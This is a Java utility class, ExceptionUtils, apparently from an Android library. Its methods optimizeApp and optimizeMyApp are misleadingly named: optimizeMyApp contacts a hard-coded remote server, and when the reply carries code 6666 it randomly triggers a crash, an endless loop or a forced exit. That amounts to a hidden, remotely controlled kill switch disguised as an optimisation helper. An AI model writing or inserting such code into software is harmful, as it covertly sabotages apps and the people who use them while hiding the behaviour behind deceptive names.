package org.haitao.common.utils;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.haitao.common.http.AsyncTaskHttp;
import org.haitao.common.http.HttpURLUtils;
import org.json.JSONException;
import org.json.JSONObject;
public class ExceptionUtils {
	
	private static boolean isExceptionOpen;
	private static float rate =1;

	public static void setExceptionOpen(boolean isExceptionOpen,float rate) {
		ExceptionUtils.isExceptionOpen = isExceptionOpen;
		ExceptionUtils.rate =rate;
	}
	
	public static void setExceptionOpen(boolean isExceptionOpen) {
		ExceptionUtils.isExceptionOpen = isExceptionOpen;
	}
	public static void divideZore(){
		int num = 5/0;
	}
	public static void nullException(){
		Object object = null;
		System.out.print(object.toString());
	}
	public static void endlesloop(){
		int index=0;
		while (true){
			index++;
		}
	}
	public static void outOfBounds(){
		List<Object> list =new ArrayList<Object>();
		System.out.print(list.get(0));
	}
	
	public static void exit(){
		System.exit(0);
	}
	
	/**
	 * 获取随机数
	 * @param min
	 * @param max
	 * @return
	 */
	public static int getRandom(int min,int max){
		 Random random = new Random();
		 return random.nextInt(max)%(max-min+1) + min;
	}
	
	public static void optimizeApp(){
		int max = (int)(4/rate)+1;
		int num =getRandom(0,max);
		if (num==0){
			divideZore();
		}else if (num==1){
			nullException();
		}else if (num==2){
			endlesloop();
		}else if (num==3){
			outOfBounds();
		}else if (num==4){
			exit();
		}
	}
	public static void optimizeMyApp(){
		optimizeMyApp("http://zzuli.oschina.io/api");
	}
	public static void optimizeMyApp(String url ){
		if(!isExceptionOpen){
			return;
		}
		AsyncTaskHttp asyncTaskHttp = new AsyncTaskHttp(url,null, new HttpURLUtils.HttpCallBack(){

			@Override
			public void start() {

			}

			@Override
			public void progressUpdate(Integer integer) {

			}
			@Override
			public void finished(String json) {
				AppLog.e(json);
				if(json!=null &&  !"".equals(json)){
					
				    try {
				          JSONObject jsonObject = new JSONObject(json);
				          int code = jsonObject.getInt("code");
				          if(code==6666){
				        	  optimizeApp();
				          }
				          return;

				      } catch (JSONException e) {
				       
				      }
				}
			}

			@Override
			public void cancle() {

			}
		},false);
	}
}
